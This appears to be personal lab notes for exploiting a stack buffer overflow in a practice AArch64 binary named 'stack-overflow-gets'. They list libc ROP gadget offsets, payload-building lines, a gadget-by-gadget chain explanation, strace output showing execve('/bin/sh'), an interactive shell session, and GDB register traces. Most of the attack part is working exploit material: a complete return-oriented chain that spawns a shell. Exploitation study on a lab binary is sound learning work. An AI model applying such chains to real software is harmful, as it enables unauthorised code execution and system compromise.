rop gadgets

g0 - 0x00062524: ldr x0, [x29, #0x18]; ldp x29, x30, [sp], #0x20; ret; 

g1 - 0x000ed2d0: mov x1, x0; ret; 

g2 - 0x0006dd44: ldp x29, x30, [sp], #0x30; br x3;

g3 - 0x0003f8a0: ldp x19, x20, [sp, #0x10]; ldp x21, x22, [sp, #0x20]; ldp x23, x24, [sp, #0x30]; ldp x29, x30, [sp], #0x40; ret; 

g4 - 0x00026dc4: mov x3, x19; mov x2, x26; blr x20;

g5 - 0x000a2b60: execve 

payload += p64(next_x29) + p64(gadget_3) + p64(0x0) * x (depends on stack) #returns to gadget_3
payload += p64(next_x29) + p64(gadget_4) + p64(gadget_1) + p64(gadget_2) + p64(0x0) * 4 # moves gadget_1/2 into x19/20 and returns to gadget_4
payload += p64(next_x29) + p64(next_gadget) #setting up for the next gadget and moving x19 into x3. x20 (gadget_2) is called from gadget_4

gadget_0 is called and x0 is set to 0x0 (future x1 value) and x30 returns to gadget_3
gadget_3 is called to make x19 = gadget_1 and x20 = gadget_2 return to gadget_4 from gadget_3, making x3 = x19 (gadget_1)
gadget_4 calls x20 (gadget_2)
gadget_2 gives us a controlled x30 and jumps to x3 (gadget_1)
gadget_1 moves x0 (0x0) into x1 and returns
gadget_0 moves pointer to /bin/sh into x0 and returns with a call to gadget_5
gadget_5 calls execve with x0 pointing to /bin/sh and x1 and x2 containing 0x0

g0 - x0 <- x29 + 0x18, pop x29, x30 (0x40), ret to g3
g3 - x19 <- g1, x20 <- g2, x21 <- x2 (value), pop x29, x30 (0x40), ret to g4
g4 - x3 <- x19 (g1), x2, x26 (maybe zero?), blr x20 (g2)
g2 - pop x29, x30 (0x40), ret to (g0) br x3 (g1)
g1 - x1 <- x0, ret to g0
g0 - x0 <- x29 + 0x18, pop x29, x30 (0x20) ret to call execve
g5 - execve

x0 <- 0, pointer to (/bin/sh)
x1 <- 0
x2 <- 0
x3 <- x19 (g1)

x19 <- sp 0x10 -> g1
x20            -> g2
x21 <- sp 0x20 -> x2
x22
x23 <- sp 0x30
x24
x26 
x29 <- sp 0x40
x30 <- g3, g4

****************************************

$ strace ./stack-overflow-gets < bin_sh.bin
execve("./stack-overflow-gets", ["./stack-overflow-gets"], 0xfffffffff530 /* 21 vars */) = 0
brk(NULL)                               = 0xaaaaaaabc000
faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
faccessat(AT_FDCWD, "/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=31512, ...}) = 0
mmap(NULL, 31512, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffff7ff3000
close(3)                                = 0
faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0 \10\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1345176, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffff7ff1000
mmap(NULL, 1413976, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffff7e77000
mprotect(0xfffff7fb8000, 61440, PROT_NONE) = 0
mmap(0xfffff7fc7000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x140000) = 0xfffff7fc7000
mmap(0xfffff7fcd000, 13144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffff7fcd000
close(3)                                = 0
mprotect(0xfffff7fc7000, 16384, PROT_READ) = 0
mprotect(0xaaaaaaaba000, 4096, PROT_READ) = 0
mprotect(0xfffff7ffd000, 4096, PROT_READ) = 0
munmap(0xfffff7ff3000, 31512)           = 0
fstat(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
brk(NULL)                               = 0xaaaaaaabc000
brk(0xaaaaaaadd000)                     = 0xaaaaaaadd000
write(1, "0xfffffffff3a0\n", 150xfffffffff3a0
)        = 15
write(1, "What's your name?\n", 18What's your name?
)     = 18
fstat(0, {st_mode=S_IFREG|0644, st_size=256, ...}) = 0
read(0, "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"..., 4096) = 256
read(0, "", 4096)                       = 0
write(1, "Hello, !\n", 9Hello, !
)               = 9
execve("/bin/sh", NULL, NULL)           = 0
brk(NULL)                               = 0xaaaaaaad8000
faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
faccessat(AT_FDCWD, "/etc/ld.so.preload", R_OK) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/etc/ld.so.cache", O_RDONLY|O_CLOEXEC) = 3
fstat(3, {st_mode=S_IFREG|0644, st_size=31512, ...}) = 0
mmap(NULL, 31512, PROT_READ, MAP_PRIVATE, 3, 0) = 0xfffff7ff3000
close(3)                                = 0
faccessat(AT_FDCWD, "/etc/ld.so.nohwcap", F_OK) = -1 ENOENT (No such file or directory)
openat(AT_FDCWD, "/lib/aarch64-linux-gnu/libc.so.6", O_RDONLY|O_CLOEXEC) = 3
read(3, "\177ELF\2\1\1\3\0\0\0\0\0\0\0\0\3\0\267\0\1\0\0\0 \10\2\0\0\0\0\0"..., 832) = 832
fstat(3, {st_mode=S_IFREG|0755, st_size=1345176, ...}) = 0
mmap(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xfffff7ff1000
mmap(NULL, 1413976, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xfffff7e77000
mprotect(0xfffff7fb8000, 61440, PROT_NONE) = 0
mmap(0xfffff7fc7000, 24576, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x140000) = 0xfffff7fc7000
mmap(0xfffff7fcd000, 13144, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xfffff7fcd000
close(3)                                = 0
mprotect(0xfffff7fc7000, 16384, PROT_READ) = 0
mprotect(0xaaaaaaad3000, 8192, PROT_READ) = 0
mprotect(0xfffff7ffd000, 4096, PROT_READ) = 0
munmap(0xfffff7ff3000, 31512)           = 0
getuid()                                = 1000
getgid()                                = 1000
getpid()                                = 30362
rt_sigaction(SIGCHLD, {sa_handler=0xaaaaaaabe040, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
geteuid()                               = 1000
brk(NULL)                               = 0xaaaaaaad8000
brk(0xaaaaaaaf9000)                     = 0xaaaaaaaf9000
getppid()                               = 30360
getcwd("/home/ubuntu/download/stack-overflow", 4096) = 37
ioctl(0, TCGETS, 0xfffffffffae0)        = -1 ENOTTY (Inappropriate ioctl for device)
geteuid()                               = 1000
getegid()                               = 1000
rt_sigaction(SIGINT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGINT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGQUIT, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGQUIT, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
rt_sigaction(SIGTERM, NULL, {sa_handler=SIG_DFL, sa_mask=[], sa_flags=0}, 8) = 0
rt_sigaction(SIGTERM, {sa_handler=SIG_DFL, sa_mask=~[RTMIN RT_1], sa_flags=0}, NULL, 8) = 0
read(0, "", 8192)                       = 0
exit_group(0)                           = ?
+++ exited with 0 +++


****************************************

$ (cat bin_sh.bin; cat) | ./stack-overflow-gets 
0xfffffffff3a0
What's your name?

Hello, !

ls 
bin_sh.bin	 bin_sh.hex.save  bin_sh_3a0.hex  libc_rop.txt	stack-overflow-gets
bin_sh.bin.org	 bin_sh1.bin	  cat		  sc.bin	stack-overflow-strcpy
bin_sh.bin.org1  bin_sh1.hex	  gdb.txt	  sc.hex
bin_sh.hex	 bin_sh_330.hex   increment.bin   sc_gdb.bin

ls -al
total 7024
drwxrwxr-x  2 ubuntu ubuntu    4096 Aug 15 17:23 .
drwxrwxr-x 14 ubuntu ubuntu    4096 Jul  9 22:47 ..
-rw-------  1 ubuntu ubuntu     134 Jun 13 19:06 .gdb_history
-rw-r--r--  1 ubuntu ubuntu     256 Aug 15 16:18 bin_sh.bin
-rw-rw-r--  1 ubuntu ubuntu      96 Jun 26 01:08 bin_sh.bin.org
-rw-r--r--  1 ubuntu ubuntu     192 Jul 12 19:19 bin_sh.bin.org1
-rw-rw-r--  1 ubuntu ubuntu      80 Jun 26 01:08 bin_sh.hex
-rw-rw-r--  1 ubuntu ubuntu      64 Jun 22 02:43 bin_sh.hex.save
-rw-rw-r--  1 ubuntu ubuntu      80 Jun 16 01:11 bin_sh1.bin
-rw-rw-r--  1 ubuntu ubuntu      66 Jun 22 00:20 bin_sh1.hex
-rw-rw-r--  1 ubuntu ubuntu      66 Jun 23 22:14 bin_sh_330.hex
-rw-rw-r--  1 ubuntu ubuntu      66 Jun 23 22:13 bin_sh_3a0.hex
-rw-rw-r--  1 ubuntu ubuntu       0 Aug 15 17:23 cat
-rw-rw-r--  1 ubuntu ubuntu 6052415 Jun 21 17:50 gdb.txt
-rw-r--r--  1 ubuntu ubuntu      80 Jun 11 23:05 increment.bin
-rw-rw-r--  1 ubuntu ubuntu 1045467 Jun 14 19:20 libc_rop.txt
-rw-rw-r--  1 ubuntu ubuntu      80 Jun 15 01:04 sc.bin
-rw-r--r--  1 ubuntu ubuntu      80 Jun  7 17:10 sc.hex
-rw-rw-r--  1 ubuntu ubuntu      80 Jun 13 12:41 sc_gdb.bin
-rwxr-xr-x  1 ubuntu ubuntu    9208 Jun 13 18:57 stack-overflow-gets
-rwxr-xr-x  1 ubuntu ubuntu    9168 Jun 13 18:57 stack-overflow-strcpy

exit

$

*****************************************

x29 follows the stack pointer sp

first breakpoint @ 0xaaaaaaaaaacc
$x29 : 0x0000fffffffff380  →  0x0000fffffffff380  →  0x0000000000000000
$x30 : 0x0000fffff7ed9524  →  <__libc_start_main+224> bl 0xfffff7eabf20 <__GI_exit>
$sp  : 0x0000fffffffff380  →  0x0000fffffffff380  →  0x0000000000000000

second breakpoint @ 0xfffff7ed9528
$x0  : 0x0000000000000000
$x29 : 0x0000fffffffff380  →  0x0000000000000000
$x30 : 0x0000fffff7ed9524  →  <_IO_cookie_seek+60> ldr x0,  [x29,  #24]
$sp  : 0x0000fffffffff380  →  0x0000000000000000

ret from gadget 0 + 0x20 @ 0xfffff7ed952c
$x29 : 0x0000fffffffff3a0  →  0x0000fffffffff3e0  →  0x0000000000000000
$x30 : 0x0000fffff7eb68a0  →  <try+136> ldp x19,  x20,  [sp,  #16]
$sp  : 0x0000fffffffff3a0  →  0x0000fffffffff3e0  →  0x0000000000000000

ldp x19, x20 + 0x10
$x19 : 0x0000fffff7f642d0  →  <__deadline_from_timeval+120> mov x1,  x0
$x20 : 0x0000fffff7ee4d44  →  <_IO_file_xsgetn_maybe_mmap+92> ldp x29,  x30,  [sp],  #48

$x29 : 0x0000fffffffff3b0  →  0x0000000000000000
$x30 : 0x0000fffff7eb68a0  →  <try+136> ldp x19,  x20,  [sp,  #16]
$sp  : 0x0000fffffffff3b0  →  0x0000000000000000

ret from gadget 3 + 0x40 @ 
$x29 : 0x0000fffffffff3f0  →  0x0000000000000000
$x30 : 0x0000fffff7e9ddc4  →  <__gconv_transform_internal_ucs2+380> mov x3,  x19
$sp  : 0x0000fffffffff3f0  →  0x0000000000000000

ldp x29, x30, [sp], #0x30
$x29 : 0x0000fffffffff410  →  0x0000000000000000
$x30 : 0x0000fffff7ed9524  →  <_IO_cookie_seek+60> ldr x0,  [x29,  #24]
$sp  : 0x0000fffffffff410  →  0x0000000000000000

ldr x0, [x29, #0x18];
ldp x29, x30, [sp], #0x20; ret; E0
$x0  : 0x0000fffffffff420  →  0x0068732f6e69622f ("/bin/sh"?)
$x1  : 0x0               
$x2  : 0x0               
$x29 : 0x0000fffffffff430  →  0x8263548e9feb2900
$x30 : 0x0000fffff7f19b60  →  <execve+0> mov x8,  #0xdd                  	// #221
$sp  : 0x0000fffffffff430  →  0x8263548e9feb2900
$pc  : 0x0000fffff7f19b60  →  <execve+0> mov x8,  #0xdd                  	// #221

